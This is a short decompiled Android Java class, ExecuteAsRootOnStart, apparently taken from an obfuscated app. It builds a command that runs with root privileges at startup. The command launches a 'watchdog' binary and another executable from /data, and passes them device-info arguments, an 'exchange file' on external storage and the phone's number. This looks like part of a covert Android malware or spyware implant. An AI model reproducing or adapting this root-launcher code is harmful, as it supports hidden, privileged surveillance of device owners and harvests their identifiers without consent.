package com.p003fa.p004c;

/* renamed from: com.fa.c.ExecuteAsRootOnStart */
public class ExecuteAsRootOnStart extends com.p003fa.p004c.ExecuteAsRootBase {
    private android.content.Context context;

    /* renamed from: com.fa.c.ExecuteAsRootOnStart$1 */
    class C04661 extends java.util.ArrayList<java.lang.String> {
        C04661() {
            add("/data/" + com.p003fa.p004c.Utilities.GetWatchDogName(com.p003fa.p004c.ExecuteAsRootOnStart.this.context) + " " + com.p003fa.p004c.Utilities.GetDeviceInfoCommandLineArgs(com.p003fa.p004c.ExecuteAsRootOnStart.this.context) + " /data/" + com.p003fa.p004c.Utilities.GetExecName(com.p003fa.p004c.ExecuteAsRootOnStart.this.context) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetExchangeFileName(com.p003fa.p004c.ExecuteAsRootOnStart.this.context) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + " " + com.p003fa.p004c.Utilities.GetPhoneNumber(com.p003fa.p004c.ExecuteAsRootOnStart.this.context));
        }
    }

    public ExecuteAsRootOnStart(android.content.Context context) {
        this.context = context;
    }

    public java.util.ArrayList<java.lang.String> getCommandsToExecute() {
        return new com.p003fa.p004c.ExecuteAsRootOnStart.C04661();
    }
}
